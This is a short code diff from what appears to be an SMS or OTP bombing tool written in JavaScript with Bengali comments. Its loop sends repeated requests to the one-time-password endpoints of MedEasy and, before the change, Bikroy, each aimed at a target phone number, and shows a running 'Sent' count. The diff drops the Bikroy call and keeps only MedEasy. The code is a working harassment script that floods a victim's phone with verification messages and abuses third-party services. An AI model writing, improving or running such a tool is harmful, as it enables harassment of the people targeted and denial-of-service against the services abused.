@@ -37,22 +37,12 @@ async function startProcess() {
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // পর্যায়ক্রমে MedEasy এবং Bikroy এপিআই কল করার লজিক
-            if (i % 2 !== 0) {
-                // ১. MedEasy API
-                await fetch(`https://api.medeasy.health/api/send-otp/+88${target}/`, { 
-                    method: 'GET', 
-                    mode: 'no-cors',
-                    cache: 'no-store'
-                });
-            } else {
-                // ২. Bikroy API
-                await fetch(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`, { 
-                    method: 'GET', 
-                    mode: 'no-cors',
-                    cache: 'no-store'
-                });
-            }
+            // শুধুমাত্র MedEasy API ব্যবহার করা হচ্ছে
+            await fetch(`https://api.medeasy.health/api/send-otp/+88${target}/`, { 
+                method: 'GET', 
+                mode: 'no-cors',
+                cache: 'no-store'
+            }); 
 
             display.innerText = "Sent: " + i;
             
